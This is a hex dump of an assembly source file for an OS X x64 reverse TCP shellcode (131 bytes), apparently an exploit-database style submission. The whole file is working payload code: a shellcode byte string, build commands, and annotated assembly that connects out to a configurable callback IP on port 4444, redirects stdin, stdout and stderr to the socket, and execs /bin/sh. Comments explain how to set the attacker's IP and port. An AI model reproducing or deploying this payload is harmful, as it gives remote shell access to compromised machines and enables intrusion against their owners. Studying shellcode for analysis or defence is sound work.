00000000  3b 6f 73 78 20 78 36 34  20 72 65 76 65 72 73 65  |;osx x64 reverse|
00000010  20 74 63 70 20 73 68 65  6c 6c 63 6f 64 65 20 28  | tcp shellcode (|
00000020  31 33 31 20 62 79 74 65  73 29 0d 0a 3b 4a 61 63  |131 bytes)..;Jac|
00000030  6f 62 20 48 61 6d 6d 61  63 6b 0d 0a 3b 6a 61 63  |ob Hammack..;jac|
00000040  6f 62 2e 68 61 6d 6d 61  63 6b 40 68 61 6d 6d 61  |ob.hammack@hamma|
00000050  63 6b 6a 2e 63 6f 6d 0d  0a 3b 68 74 74 70 3a 2f  |ckj.com..;http:/|
00000060  2f 77 77 77 2e 68 61 6d  6d 61 63 6b 6a 2e 63 6f  |/www.hammackj.co|
00000070  6d 0d 0a 3b 0d 0a 3b 70  72 6f 70 73 20 74 6f 20  |m..;..;props to |
00000080  68 74 74 70 3a 2f 2f 77  77 77 2e 74 68 65 78 70  |http://www.thexp|
00000090  6c 6f 69 74 2e 63 6f 6d  2f 20 66 6f 72 20 74 68  |loit.com/ for th|
000000a0  65 20 62 6c 6f 67 20 70  6f 73 74 73 20 6f 6e 20  |e blog posts on |
000000b0  78 36 34 20 6f 73 78 20  61 73 6d 0d 0a 3b 49 20  |x64 osx asm..;I |
000000c0  62 6f 72 72 6f 77 65 64  20 73 6f 6d 65 20 6f 66  |borrowed some of|
000000d0  20 68 69 73 20 63 6f 64  65 0d 0a 3b 0d 0a 20 0d  | his code..;.. .|
000000e0  0a 3b 23 4f 53 58 20 72  65 76 65 72 73 65 20 74  |.;#OSX reverse t|
000000f0  63 70 20 73 68 65 6c 6c  20 28 31 33 31 20 62 79  |cp shell (131 by|
00000100  74 65 73 29 0d 0a 3b 23  72 65 70 6c 61 63 65 20  |tes)..;#replace |
00000110  46 46 46 46 46 46 46 46  20 61 72 6f 75 6e 64 20  |FFFFFFFF around |
00000120  62 79 74 65 20 34 33 20  77 69 74 68 20 74 68 65  |byte 43 with the|
00000130  20 63 61 6c 6c 20 62 61  63 6b 20 69 70 20 69 6e  | call back ip in|
00000140  20 68 65 78 0d 0a 3b 23  72 65 70 6c 61 63 65 20  | hex..;#replace |
00000150  35 43 31 31 20 61 72 6f  75 6e 64 20 62 79 74 65  |5C11 around byte|
00000160  20 33 39 20 77 69 74 68  20 61 20 6e 65 77 20 70  | 39 with a new p|
00000170  6f 72 74 20 63 75 72 72  65 6e 74 20 69 73 20 34  |ort current is 4|
00000180  34 34 34 0d 0a 3b 73 68  65 6c 6c 63 6f 64 65 20  |444..;shellcode |
00000190  3d 0d 0a 3b 22 5c 78 34  31 5c 78 42 30 5c 78 30  |=..;"\x41\xB0\x0|
000001a0  32 5c 78 34 39 5c 78 43  31 5c 78 45 30 5c 78 31  |2\x49\xC1\xE0\x1|
000001b0  38 5c 78 34 39 5c 78 38  33 5c 78 43 38 5c 78 36  |8\x49\x83\xC8\x6|
000001c0  31 5c 78 34 43 5c 78 38  39 5c 78 43 30 5c 78 34  |1\x4C\x89\xC0\x4|
000001d0  38 22 20 2b 0d 0a 3b 22  5c 78 33 31 5c 78 44 32  |8" +..;"\x31\xD2|
000001e0  5c 78 34 38 5c 78 38 39  5c 78 44 36 5c 78 34 38  |\x48\x89\xD6\x48|
000001f0  5c 78 46 46 5c 78 43 36  5c 78 34 38 5c 78 38 39  |\xFF\xC6\x48\x89|
00000200  5c 78 46 37 5c 78 34 38  5c 78 46 46 5c 78 43 37  |\xF7\x48\xFF\xC7|
00000210  5c 78 30 46 22 20 2b 0d  0a 3b 22 5c 78 30 35 5c  |\x0F" +..;"\x05\|
00000220  78 34 39 5c 78 38 39 5c  78 43 34 5c 78 34 39 5c  |x49\x89\xC4\x49\|
00000230  78 42 44 5c 78 30 31 5c  78 30 31 5c 78 31 31 5c  |xBD\x01\x01\x11\|
00000240  78 35 43 5c 78 46 46 5c  78 46 46 5c 78 46 46 5c  |x5C\xFF\xFF\xFF\|
00000250  78 46 46 5c 78 34 31 22  20 2b 0d 0a 3b 22 5c 78  |xFF\x41" +..;"\x|
00000260  42 31 5c 78 46 46 5c 78  34 44 5c 78 32 39 5c 78  |B1\xFF\x4D\x29\x|
00000270  43 44 5c 78 34 31 5c 78  35 35 5c 78 34 39 5c 78  |CD\x41\x55\x49\x|
00000280  38 39 5c 78 45 35 5c 78  34 39 5c 78 46 46 5c 78  |89\xE5\x49\xFF\x|
00000290  43 30 5c 78 34 43 5c 78  38 39 22 20 2b 0d 0a 3b  |C0\x4C\x89" +..;|
000002a0  22 5c 78 43 30 5c 78 34  43 5c 78 38 39 5c 78 45  |"\xC0\x4C\x89\xE|
000002b0  37 5c 78 34 43 5c 78 38  39 5c 78 45 45 5c 78 34  |7\x4C\x89\xEE\x4|
000002c0  38 5c 78 38 33 5c 78 43  32 5c 78 31 30 5c 78 30  |8\x83\xC2\x10\x0|
000002d0  46 5c 78 30 35 5c 78 34  39 5c 78 38 33 22 20 2b  |F\x05\x49\x83" +|
000002e0  0d 0a 3b 22 5c 78 45 38  5c 78 30 38 5c 78 34 38  |..;"\xE8\x08\x48|
000002f0  5c 78 33 31 5c 78 46 36  5c 78 34 43 5c 78 38 39  |\x31\xF6\x4C\x89|
00000300  5c 78 43 30 5c 78 34 43  5c 78 38 39 5c 78 45 37  |\xC0\x4C\x89\xE7|
00000310  5c 78 30 46 5c 78 30 35  5c 78 34 38 5c 78 38 33  |\x0F\x05\x48\x83|
00000320  22 20 2b 0d 0a 3b 22 5c  78 46 45 5c 78 30 32 5c  |" +..;"\xFE\x02\|
00000330  78 34 38 5c 78 46 46 5c  78 43 36 5c 78 37 36 5c  |x48\xFF\xC6\x76\|
00000340  78 45 46 5c 78 34 39 5c  78 38 33 5c 78 45 38 5c  |xEF\x49\x83\xE8\|
00000350  78 31 46 5c 78 34 43 5c  78 38 39 5c 78 43 30 5c  |x1F\x4C\x89\xC0\|
00000360  78 34 38 22 20 2b 0d 0a  3b 22 5c 78 33 31 5c 78  |x48" +..;"\x31\x|
00000370  44 32 5c 78 34 39 5c 78  42 44 5c 78 46 46 5c 78  |D2\x49\xBD\xFF\x|
00000380  32 46 5c 78 36 32 5c 78  36 39 5c 78 36 45 5c 78  |2F\x62\x69\x6E\x|
00000390  32 46 5c 78 37 33 5c 78  36 38 5c 78 34 39 5c 78  |2F\x73\x68\x49\x|
000003a0  43 31 5c 78 45 44 22 20  2b 0d 0a 3b 22 5c 78 30  |C1\xED" +..;"\x0|
000003b0  38 5c 78 34 31 5c 78 35  35 5c 78 34 38 5c 78 38  |8\x41\x55\x48\x8|
000003c0  39 5c 78 45 37 5c 78 34  38 5c 78 33 31 5c 78 46  |9\xE7\x48\x31\xF|
000003d0  36 5c 78 30 46 5c 78 30  35 22 0d 0a 20 0d 0a 3b  |6\x0F\x05".. ..;|
000003e0  6e 61 73 6d 20 2d 66 20  6d 61 63 68 6f 20 72 65  |nasm -f macho re|
000003f0  76 65 72 73 65 5f 74 63  70 2e 73 20 2d 6f 20 72  |verse_tcp.s -o r|
00000400  65 76 65 72 73 65 5f 74  63 70 2e 6f 0d 0a 3b 6c  |everse_tcp.o..;l|
00000410  64 20 2d 6f 20 72 65 76  65 72 73 65 5f 74 63 70  |d -o reverse_tcp|
00000420  20 2d 65 20 73 74 61 72  74 20 72 65 76 65 72 73  | -e start revers|
00000430  65 5f 74 63 70 2e 6f 0d  0a 20 0d 0a 42 49 54 53  |e_tcp.o.. ..BITS|
00000440  20 36 34 0d 0a 20 0d 0a  73 65 63 74 69 6f 6e 20  | 64.. ..section |
00000450  2e 74 65 78 74 0d 0a 67  6c 6f 62 61 6c 20 73 74  |.text..global st|
00000460  61 72 74 0d 0a 20 0d 0a  73 74 61 72 74 3a 0d 0a  |art.. ..start:..|
00000470  20 20 6d 6f 76 20 72 38  62 2c 20 30 78 30 32 20  |  mov r8b, 0x02 |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 20  |              ; |
00000490  75 6e 69 78 20 63 6c 61  73 73 20 73 79 73 74 65  |unix class syste|
000004a0  6d 20 63 61 6c 6c 73 20  3d 20 32 0d 0a 20 20 73  |m calls = 2..  s|
000004b0  68 6c 20 72 38 2c 20 32  34 20 20 20 20 20 20 20  |hl r8, 24       |
000004c0  20 20 20 20 20 20 20 20  20 20 20 3b 20 73 68 69  |           ; shi|
000004d0  66 74 20 6c 65 66 74 20  32 34 20 74 6f 20 74 68  |ft left 24 to th|
000004e0  65 20 75 70 70 65 72 20  6f 72 64 65 72 20 62 69  |e upper order bi|
000004f0  74 73 0d 0a 20 20 6f 72  20 72 38 2c 20 30 78 36  |ts..  or r8, 0x6|
00000500  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
00000510  20 20 3b 20 73 6f 63 6b  65 74 20 69 73 20 30 78  |  ; socket is 0x|
00000520  36 31 0d 0a 20 20 6d 6f  76 20 72 61 78 2c 20 72  |61..  mov rax, r|
00000530  38 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |8               |
00000540  20 20 3b 20 70 75 74 20  73 6f 63 6b 65 74 20 73  |  ; put socket s|
00000550  79 73 63 61 6c 6c 20 23  20 69 6e 74 6f 20 72 61  |yscall # into ra|
00000560  78 0d 0a 20 0d 0a 3b 53  6f 63 6b 65 74 0d 0a 20  |x.. ..;Socket.. |
00000570  20 78 6f 72 20 72 64 78  2c 20 72 64 78 20 20 20  | xor rdx, rdx   |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 7a  |             ; z|
00000590  65 72 6f 20 6f 75 74 20  72 64 78 0d 0a 20 20 6d  |ero out rdx..  m|
000005a0  6f 76 20 72 73 69 2c 20  72 64 78 20 20 20 20 20  |ov rsi, rdx     |
000005b0  20 20 20 20 20 20 20 20  20 20 20 3b 20 41 46 5f  |           ; AF_|
000005c0  4e 45 54 20 3d 20 31 0d  0a 20 20 69 6e 63 20 72  |NET = 1..  inc r|
000005d0  73 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |si              |
000005e0  20 20 20 20 20 20 20 3b  20 72 73 69 20 3d 20 41  |       ; rsi = A|
000005f0  46 5f 4e 45 54 0d 0a 20  20 6d 6f 76 20 72 64 69  |F_NET..  mov rdi|
00000600  2c 20 72 73 69 20 20 20  20 20 20 20 20 20 20 20  |, rsi           |
00000610  20 20 20 20 20 3b 20 53  4f 43 4b 5f 53 54 52 45  |     ; SOCK_STRE|
00000620  41 4d 20 3d 20 32 0d 0a  20 20 69 6e 63 20 72 64  |AM = 2..  inc rd|
00000630  69 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |i               |
00000640  20 20 20 20 20 20 3b 20  72 64 69 20 3d 20 53 4f  |      ; rdi = SO|
00000650  43 4b 5f 53 54 52 45 41  4d 0d 0a 20 20 73 79 73  |CK_STREAM..  sys|
00000660  63 61 6c 6c 20 20 20 20  20 20 20 20 20 20 20 20  |call            |
00000670  20 20 20 20 20 20 20 20  20 3b 20 63 61 6c 6c 20  |         ; call |
00000680  73 6f 63 6b 65 74 28 53  4f 43 4b 5f 53 54 52 45  |socket(SOCK_STRE|
00000690  41 4d 2c 20 41 46 5f 4e  45 54 2c 20 30 29 3b 0d  |AM, AF_NET, 0);.|
000006a0  0a 20 0d 0a 20 20 6d 6f  76 20 72 31 32 2c 20 72  |. ..  mov r12, r|
000006b0  61 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |ax              |
000006c0  20 20 3b 20 53 61 76 65  20 74 68 65 20 73 6f 63  |  ; Save the soc|
000006d0  6b 65 74 0d 0a 20 0d 0a  3b 53 6f 63 6b 5f 61 64  |ket.. ..;Sock_ad|
000006e0  64 72 0d 0a 20 20 6d 6f  76 20 72 31 33 2c 20 30  |dr..  mov r13, 0|
000006f0  78 46 46 46 46 46 46 46  46 35 43 31 31 30 31 30  |xFFFFFFFF5C11010|
00000700  31 20 3b 20 49 50 20 3d  20 46 46 46 46 46 46 46  |1 ; IP = FFFFFFF|
00000710  46 2c 20 50 6f 72 74 20  3d 20 35 43 31 31 28 34  |F, Port = 5C11(4|
00000720  34 34 34 29 0d 0a 20 20  6d 6f 76 20 72 39 62 2c  |444)..  mov r9b,|
00000730  20 30 78 46 46 20 20 20  20 20 20 20 20 20 20 20  | 0xFF           |
00000740  20 20 20 20 3b 20 54 68  65 20 73 6f 63 6b 5f 61  |    ; The sock_a|
00000750  64 64 72 5f 69 6e 20 69  73 20 2b 20 46 46 20 66  |ddr_in is + FF f|
00000760  72 6f 6d 20 77 68 65 72  65 20 77 65 20 6e 65 65  |rom where we nee|
00000770  64 20 69 74 0d 0a 20 20  73 75 62 20 72 31 33 2c  |d it..  sub r13,|
00000780  20 72 39 20 20 20 20 20  20 20 20 20 20 20 20 20  | r9             |
00000790  20 20 20 20 3b 20 53 6f  20 77 65 20 73 75 62 20  |    ; So we sub |
000007a0  30 78 46 46 20 66 72 6f  6d 20 69 74 20 74 6f 20  |0xFF from it to |
000007b0  67 65 74 20 74 68 65 20  63 6f 72 72 65 63 74 20  |get the correct |
000007c0  76 61 6c 75 65 20 61 6e  64 20 61 76 6f 69 64 20  |value and avoid |
000007d0  61 20 6e 75 6c 6c 0d 0a  20 20 70 75 73 68 20 72  |a null..  push r|
000007e0  31 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |13              |
000007f0  20 20 20 20 20 20 3b 20  50 75 73 68 20 69 74 20  |      ; Push it |
00000800  6f 6e 20 74 68 65 20 73  74 61 63 6b 0d 0a 20 20  |on the stack..  |
00000810  6d 6f 76 20 72 31 33 2c  20 72 73 70 20 20 20 20  |mov r13, rsp    |
00000820  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 53 61  |            ; Sa|
00000830  76 65 20 74 68 65 20 73  6f 63 6b 5f 61 64 64 72  |ve the sock_addr|
00000840  5f 69 6e 20 69 6e 74 6f  20 72 31 33 0d 0a 20 0d  |_in into r13.. .|
00000850  0a 20 0d 0a 3b 43 6f 6e  6e 65 63 74 0d 0a 20 20  |. ..;Connect..  |
00000860  69 6e 63 20 72 38 20 20  20 20 20 20 20 20 20 20  |inc r8          |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 43 6f  |            ; Co|
00000880  6e 6e 65 63 74 20 3d 20  30 78 36 32 2c 20 73 6f  |nnect = 0x62, so|
00000890  20 77 65 20 69 6e 63 20  62 79 20 6f 6e 65 20 66  | we inc by one f|
000008a0  72 6f 6d 20 74 68 65 20  70 72 65 76 69 6f 75 73  |rom the previous|
000008b0  20 73 79 73 63 61 6c 6c  0d 0a 20 20 6d 6f 76 20  | syscall..  mov |
000008c0  72 61 78 2c 20 72 38 20  20 20 20 20 20 20 20 20  |rax, r8         |
000008d0  20 20 20 20 20 20 20 20  3b 20 6d 6f 76 65 20 74  |        ; move t|
000008e0  68 61 74 20 69 6e 74 6f  20 72 61 78 0d 0a 20 20  |hat into rax..  |
000008f0  6d 6f 76 20 72 64 69 2c  20 72 31 32 20 20 20 20  |mov rdi, r12    |
00000900  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 6d 6f  |            ; mo|
00000910  76 65 20 74 68 65 20 73  61 76 65 64 20 73 6f 63  |ve the saved soc|
00000920  6b 65 74 20 66 64 20 69  6e 74 6f 20 72 64 69 0d  |ket fd into rdi.|
00000930  0a 20 20 6d 6f 76 20 72  73 69 2c 20 72 31 33 20  |.  mov rsi, r13 |
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000950  20 6d 6f 76 65 20 74 68  65 20 73 61 76 65 64 20  | move the saved |
00000960  73 6f 63 6b 5f 61 64 64  72 5f 69 6e 20 69 6e 74  |sock_addr_in int|
00000970  6f 20 72 73 69 0d 0a 20  20 61 64 64 20 72 64 78  |o rsi..  add rdx|
00000980  2c 20 30 78 31 30 20 20  20 20 20 20 20 20 20 20  |, 0x10          |
00000990  20 20 20 20 20 3b 20 61  64 64 20 30 78 31 30 20  |     ; add 0x10 |
000009a0  74 6f 20 72 64 78 0d 0a  20 20 73 79 73 63 61 6c  |to rdx..  syscal|
000009b0  6c 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |l               |
000009c0  20 20 20 20 20 20 3b 20  63 61 6c 6c 20 63 6f 6e  |      ; call con|
000009d0  6e 65 63 74 28 72 64 69  2c 20 72 73 69 2c 20 72  |nect(rdi, rsi, r|
000009e0  64 78 29 0d 0a 20 0d 0a  20 20 73 75 62 20 72 38  |dx).. ..  sub r8|
000009f0  2c 20 30 78 38 20 20 20  20 20 20 20 20 20 20 20  |, 0x8           |
00000a00  20 20 20 20 20 20 3b 20  73 75 62 74 72 61 63 74  |      ; subtract|
00000a10  20 38 20 66 72 6f 6d 20  72 38 20 66 6f 72 20 74  | 8 from r8 for t|
00000a20  68 65 20 6e 65 78 74 20  73 79 73 63 61 6c 6c 20  |he next syscall |
00000a30  64 75 70 32 20 30 78 39  30 0d 0a 20 20 78 6f 72  |dup2 0x90..  xor|
00000a40  20 72 73 69 2c 20 72 73  69 20 20 20 20 20 20 20  | rsi, rsi       |
00000a50  20 20 20 20 20 20 20 20  20 3b 20 7a 65 72 6f 20  |         ; zero |
00000a60  6f 75 74 20 72 73 69 0d  0a 20 0d 0a 64 75 70 3a  |out rsi.. ..dup:|
00000a70  0d 0a 20 20 6d 6f 76 20  72 61 78 2c 20 72 38 20  |..  mov rax, r8 |
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a90  3b 20 6d 6f 76 65 20 74  68 65 20 73 79 73 63 61  |; move the sysca|
00000aa0  6c 6c 20 66 6f 72 20 64  75 70 32 20 69 6e 74 6f  |ll for dup2 into|
00000ab0  20 72 61 78 0d 0a 20 20  6d 6f 76 20 72 64 69 2c  | rax..  mov rdi,|
00000ac0  20 72 31 32 20 20 20 20  20 20 20 20 20 20 20 20  | r12            |
00000ad0  20 20 20 20 3b 20 6d 6f  76 65 20 74 68 65 20 46  |    ; move the F|
00000ae0  44 20 66 6f 72 20 74 68  65 20 73 6f 63 6b 65 74  |D for the socket|
00000af0  20 69 6e 74 6f 20 72 64  69 0d 0a 20 20 73 79 73  | into rdi..  sys|
00000b00  63 61 6c 6c 20 20 20 20  20 20 20 20 20 20 20 20  |call            |
00000b10  20 20 20 20 20 20 20 20  20 3b 20 63 61 6c 6c 20  |         ; call |
00000b20  64 75 70 32 28 72 64 69  2c 20 72 73 69 29 0d 0a  |dup2(rdi, rsi)..|
00000b30  20 0d 0a 20 20 63 6d 70  20 72 73 69 2c 20 30 78  | ..  cmp rsi, 0x|
00000b40  32 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2               |
00000b50  20 3b 20 63 68 65 63 6b  20 74 6f 20 73 65 65 20  | ; check to see |
00000b60  69 66 20 77 65 20 61 72  65 20 73 74 69 6c 6c 20  |if we are still |
00000b70  75 6e 64 65 72 20 32 0d  0a 20 20 69 6e 63 20 72  |under 2..  inc r|
00000b80  73 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |si              |
00000b90  20 20 20 20 20 20 20 3b  20 69 6e 63 20 72 73 69  |       ; inc rsi|
00000ba0  0d 0a 20 20 6a 62 65 20  64 75 70 20 20 20 20 20  |..  jbe dup     |
00000bb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bc0  3b 20 6a 6d 70 20 69 66  20 6c 65 73 73 20 74 68  |; jmp if less th|
00000bd0  61 6e 20 32 0d 0a 20 0d  0a 20 20 73 75 62 20 72  |an 2.. ..  sub r|
00000be0  38 2c 20 30 78 31 46 20  20 20 20 20 20 20 20 20  |8, 0x1F         |
00000bf0  20 20 20 20 20 20 20 3b  20 73 65 74 75 70 20 74  |       ; setup t|
00000c00  68 65 20 65 78 65 63 20  73 79 73 63 61 6c 6c 20  |he exec syscall |
00000c10  61 74 20 30 78 33 62 0d  0a 20 20 6d 6f 76 20 72  |at 0x3b..  mov r|
00000c20  61 78 2c 20 72 38 20 20  20 20 20 20 20 20 20 20  |ax, r8          |
00000c30  20 20 20 20 20 20 20 3b  20 6d 6f 76 65 20 74 68  |       ; move th|
00000c40  65 20 73 79 73 63 61 6c  6c 20 69 6e 74 6f 20 72  |e syscall into r|
00000c50  61 78 0d 0a 20 0d 0a 3b  65 78 65 63 0d 0a 20 20  |ax.. ..;exec..  |
00000c60  78 6f 72 20 72 64 78 2c  20 72 64 78 20 20 20 20  |xor rdx, rdx    |
00000c70  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 7a 65  |            ; ze|
00000c80  72 6f 20 6f 75 74 20 72  64 78 0d 0a 20 20 6d 6f  |ro out rdx..  mo|
00000c90  76 20 72 31 33 2c 20 30  78 36 38 37 33 32 66 36  |v r13, 0x68732f6|
00000ca0  65 36 39 36 32 32 66 46  46 20 3b 20 27 2f 62 69  |e69622fFF ; '/bi|
00000cb0  6e 2f 73 68 27 20 69 6e  20 68 65 78 0d 0a 20 20  |n/sh' in hex..  |
00000cc0  73 68 72 20 72 31 33 2c  20 38 20 20 20 20 20 20  |shr r13, 8      |
00000cd0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 73 68  |            ; sh|
00000ce0  69 66 74 20 72 69 67 68  74 20 74 6f 20 63 72 65  |ift right to cre|
00000cf0  61 74 65 20 74 68 65 20  6e 75 6c 6c 20 74 65 72  |ate the null ter|
00000d00  6d 69 6e 61 74 6f 72 0d  0a 20 20 70 75 73 68 20  |minator..  push |
00000d10  72 31 33 20 20 20 20 20  20 20 20 20 20 20 20 20  |r13             |
00000d20  20 20 20 20 20 20 20 3b  20 70 75 73 68 20 74 6f  |       ; push to|
00000d30  20 74 68 65 20 73 74 61  63 6b 0d 0a 20 20 6d 6f  | the stack..  mo|
00000d40  76 20 72 64 69 2c 20 72  73 70 20 20 20 20 20 20  |v rdi, rsp      |
00000d50  20 20 20 20 20 20 20 20  20 20 3b 20 6d 6f 76 65  |          ; move|
00000d60  20 74 68 65 20 63 6f 6d  6d 61 6e 64 20 66 72 6f  | the command fro|
00000d70  6d 20 74 68 65 20 73 74  61 63 6b 20 74 6f 20 72  |m the stack to r|
00000d80  64 69 0d 0a 20 20 78 6f  72 20 72 73 69 2c 20 72  |di..  xor rsi, r|
00000d90  73 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |si              |
00000da0  20 20 3b 20 7a 65 72 6f  20 6f 75 74 20 72 73 69  |  ; zero out rsi|
00000db0  0d 0a 20 20 73 79 73 63  61 6c 6c 20 20 20 20 20  |..  syscall     |
00000dc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000dd0  3b 20 63 61 6c 6c 20 65  78 65 63 28 72 64 69 2c  |; call exec(rdi,|
00000de0  20 30 2c 20 30 29                                 | 0, 0)|
00000de6
